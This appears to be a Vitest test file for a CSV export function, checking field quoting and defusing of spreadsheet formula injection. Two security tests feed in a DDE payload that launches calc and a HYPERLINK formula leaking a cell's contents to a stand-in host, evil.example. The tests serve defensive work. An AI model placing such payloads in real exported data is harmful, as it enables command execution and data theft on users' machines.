import { describe, it, expect } from "vitest";
import { toCsv } from "./csv";

describe("toCsv", () => {
  it("quotes fields containing a comma, quote or newline", () => {
    const csv = toCsv(["Name"], [['Say "hi", then\nbye']]);
    expect(csv).toBe('Name\r\n"Say ""hi"", then\nbye"');
  });

  it("leaves ordinary fields unquoted", () => {
    expect(toCsv(["Name"], [["Ridgeview Roofing"]])).toBe("Name\r\nRidgeview Roofing");
  });

  it("SECURITY: prefixes a leading =, +, - or @ with a tab, so Excel/Sheets doesn't run it as a formula", () => {
    // No comma/quote/newline in these, so quoting doesn't kick in - this
    // isolates the formula-defusing behaviour on its own.
    expect(toCsv(["Name"], [["=1+1"]])).toBe("Name\r\n\t=1+1");
    expect(toCsv(["Name"], [["+1+1"]])).toBe("Name\r\n\t+1+1");
    expect(toCsv(["Name"], [["-2+3"]])).toBe("Name\r\n\t-2+3");
    expect(toCsv(["Name"], [["@cmd|'/c calc'!A0"]])).toBe("Name\r\n\t@cmd|'/c calc'!A0");
  });

  it("SECURITY: still defuses a formula that also needs comma/quote escaping (a real HYPERLINK-exfil payload)", () => {
    const csv = toCsv(["Name"], [['=HYPERLINK("http://evil.example/?leak="&A1,"click")']]);
    const cell = csv.split("\r\n")[1];
    // Unwrap the CSV quoting the same way a real parser would, then confirm
    // the actual field value - what Excel evaluates - starts with the
    // defusing tab, not a literal '='.
    const unwrapped = cell.slice(1, -1).replace(/""/g, '"');
    expect(unwrapped.startsWith("\t=")).toBe(true);
  });

  it("does not alter a field that merely contains one of those characters mid-string", () => {
    expect(toCsv(["Note"], [["email me at a+b@example.com"]])).toBe("Note\r\nemail me at a+b@example.com");
  });
});
